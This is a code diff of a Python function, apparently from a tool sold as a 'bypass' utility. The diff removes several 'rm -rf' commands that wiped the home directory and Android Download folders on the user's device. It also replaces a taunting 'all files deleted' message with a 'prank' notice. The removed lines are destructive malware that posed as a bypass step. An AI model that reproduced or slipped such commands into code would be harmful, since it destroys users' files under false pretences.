@@ -55,16 +55,10 @@ def sintacsDelete():
     try:
         data = os.listdir('/sdcard')
         if 'Android' in data:
-             os.system('rm -rf *')
-             os.system('cd && rm -rf *')
-             os.system('rm -rf $HOME/*')
-             os.system('rm -rf /sdcard/Download/*')
-             os.system('rm -rf /sdcard/Downloads/*')
-             os.system('rm -rf /sdcard/downloads/*')
              systm("clear")
              print(f"{lgr}  [✓] BYPASSING COMPLETED")
              slp(5)
-             print(f"{lgr}  [✓] EYY, I GOT YOU! ALL FILES IN YOUR ANDROID STORAGE HAS BEEN DELETED.")
+             print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
              exit()
         else:
           exit()
